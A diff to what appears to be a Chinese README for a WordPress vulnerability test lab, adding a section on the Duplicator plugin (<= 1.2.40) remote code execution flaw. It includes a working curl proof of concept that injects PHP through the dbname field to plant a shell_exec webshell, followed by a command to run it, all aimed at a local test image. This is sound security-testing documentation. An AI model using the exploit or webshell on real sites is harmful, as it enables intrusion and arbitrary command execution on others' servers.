@@ -22,7 +22,7 @@
 
   - 说明
 
-    从4.6.1升级产生，已安装插件**WooCommerce**
+    从4.6.1升级产生，已安装插件**WooCommerce**，根目录添加了Duplicator插件产生的installer-backup.php用于测试
 
 
 
@@ -143,6 +143,36 @@ php -d phar.readonly=false gen-phar-payload.php
 
 ```shell
 curl -d "<?xml version="1.0" encoding="utf-8"?><methodCall><methodName>wp.getMediaItem</methodName><params><param><value><string>11</string></value></param><param><value><string>admin</string></value></param><param><value><string>admin</string></value></param><param><value><int>12</int></value></param></params></methodCall>"  http://127.0.0.1/xmlrpc.php
+```
+
+
+
+## Wordpress Duplicator 插件代码执行漏洞
+
+测试镜像
+
+- src/wordpress/4.9.8/
+
+影响版本
+
+- Duplicator <= 1.2.40 尚未修复
+
+参考链接
+
+- [Remote code execution vulnerability in WordPress Duplicator](https://www.synacktiv.com/ressources/advisories/WordPress_Duplicator-1.2.40-RCE.pdf)
+
+Poc
+
+测试镜像中已经添加了包含漏洞的文件installer-backup.php，测试方法：
+
+```shell
+curl -d "action_ajax=3&action_step=3&dbhost=nowhere&dbuser=test&dbpass=test&dbname=test');
+file_put_contents(\"test.php\", '<pre><?php if (isset(\$_GET[\"synacktiv_backdoor\"])) { echo
+shell_exec(\$_GET[\"synacktiv_backdoor\"]); } ?></pre>'); /*&dbport=12345&"  http://127.0.0.1/installer-backup.php && curl http://127.0.0.1/wp-config.php
+```
+访问在根目录生成的webshell test.php:
+```shell
+curl http://127.0.0.1/test.php?synacktiv_backdoor=id
 ```
 
 
